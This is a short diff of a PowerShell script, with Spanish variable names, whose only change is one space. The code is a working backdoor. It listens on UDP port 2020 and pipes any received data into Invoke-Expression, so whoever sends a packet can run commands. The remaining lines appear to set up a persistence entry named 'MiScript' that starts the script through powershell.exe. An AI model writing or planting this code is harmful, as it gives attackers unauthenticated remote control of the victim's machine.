@@ -1,4 +1,4 @@
-$rutaScript = Join-Path $env:HOMEDRIVE "\Users\$env:USERNAME\script.ps1";$port = 2020;$endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $port);$udpclient = New-Object System.Net.Sockets.UdpClient $port;$content = $udpclient.Receive([ref]$endpoint);[Text.Encoding]::ASCII.GetString($content) | iex;$udpclient.Dispose() > $rutaScript
+$rutaScript = Join-Path $env:HOMEDRIVE "\Users\$env:USERNAME\script.ps1";$port = 2020;$endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $port);$udpclient = New-Object System.Net.Sockets.UdpClient $port;$content = $udpclient.Receive([ref]$endpoint);[Text.Encoding]::ASCII.GetString($content) | iex ;$udpclient.Dispose() > $rutaScript
 
 $nombreEntrada = "MiScript"
 $valorEntrada = "powershell.exe -File $rutaScript"
